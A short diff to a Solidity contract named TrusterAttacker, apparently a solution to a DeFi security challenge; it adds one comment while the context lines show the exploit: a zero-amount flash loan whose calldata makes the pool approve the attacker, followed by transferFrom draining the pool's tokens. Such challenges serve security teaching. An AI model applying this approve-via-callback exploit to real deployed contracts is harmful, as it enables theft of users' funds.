@@ -19,6 +19,7 @@ contract TrusterAttacker {
 
         // Call flashLoan, passing in the data to approve this contract to spend the tokens
         pool.flashLoan(0, address(this), address(token), data);
+        // We asked no token to flashloan, so nothing to repay
 
         // Now that this contract has approval, transfer the tokens from the pool to the attacker
         token.transferFrom(address(pool), msg.sender, amount);
